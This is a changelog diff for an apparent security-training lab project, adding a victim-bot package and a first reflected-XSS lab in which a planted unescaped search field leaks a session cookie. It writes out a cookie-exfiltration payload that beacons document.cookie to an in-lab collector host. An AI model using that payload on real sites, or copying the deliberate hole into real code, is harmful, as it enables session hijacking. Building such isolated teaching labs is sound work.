@@ -6,7 +6,32 @@ All notable changes to this project are documented here. Format loosely follows
 
 ## [Unreleased]
 
-### track-sqli-d-mssql-openrowset — MSSQL Stacked Queries + OPENROWSET (1, 3rd heavy lab, 25/25 SQLi COMPLETE)
+### track-xss-a-reflected — XSS victim-bot infra + first reflected lab (SQLi track done, XSS track begins)
+
+- **`packages/xss-verifier`** (new shared package): a generic, env-driven **headless-Chromium victim
+  bot** (Playwright, Python) for the XSS track. XSS is not grep-verifiable — the payload must run in a
+  real browser — so this package IS that browser. One generic image serves every XSS lab; all behaviour
+  comes from `XSSBOT_*` env (origin, login URL, queue URL, interval), so no lab ships bot code. The bot
+  establishes its victim session at runtime by navigating an app `/internal/bot-login` endpoint (the
+  per-container secret is never baked in or passed through env). Chromium runs `--no-sandbox
+--disable-dev-shm-usage` so it works under the lab posture (`cap_drop: ALL`, `read_only`,
+  `no-new-privileges`, non-root). README ships a compose + programmatic usage example.
+- `reflected-xss-search-noescape` (**apprentice**): the first XSS lab and first consumer of the shared
+  verifier. A bookshop reflects `?q=` into the search heading via an autoescape-disabled Jinja render
+  (the canonical reflected-XSS footgun). A payload submitted through `POST /report` runs in the admin
+  bot's browser, reads its **non-HttpOnly** `session` cookie, and beacons it to the in-lab collector
+  (`new Image().src='http://collector:9000/report?c='+document.cookie`). The learner reads the exfil via
+  the app proxy `GET /oob/received` and `POST /solve`s the 32-hex session for the flag.
+- **Lab shape (sets the XSS-track pattern):** 3 services — `app` (Flask, the size/Trivy-gated
+  `websec-lab/` image), `bot` (shared verifier, tagged `xssbot/` as browser infra like a pulled DB
+  engine — posture-gated but not size-gated), `collector` (stdlib http.server, reused from SQLi OOB).
+  2 networks: `edge` (app published to loopback) + `backend` (`internal: true`, egress-drop, fixed
+  subnet `172.31.240.0/24`). The stolen cookie can reach only the in-lab collector, never the internet.
+- **Anti-bypass:** `/internal/bot-login` (mints the admin cookie via `Set-Cookie`) and `/internal/queue`
+  are firewalled to the backend subnet by source IP AND gated by a `BOT_KEY`, so a public-side visitor
+  cannot fetch the admin cookie directly — the reflected-XSS path is the only way in. `risk: low`.
+- Catalog reconciled (Hybrid): the entry's `tech_stack` updated from the aspirational Puppeteer/Node/nginx
+  stack to the shipped Flask + Playwright-verifier + stdlib-collector stack; drift-lint green (26 impl).
 
 - `sqli-mssql-stacked-openrowset-exfil` (**expert**, `resource_tier: heavy`): Stacked-query injection in a
   Flask + pyodbc asset inventory backed by **MSSQL 2022 Developer (CU16, Linux)**. The search endpoint
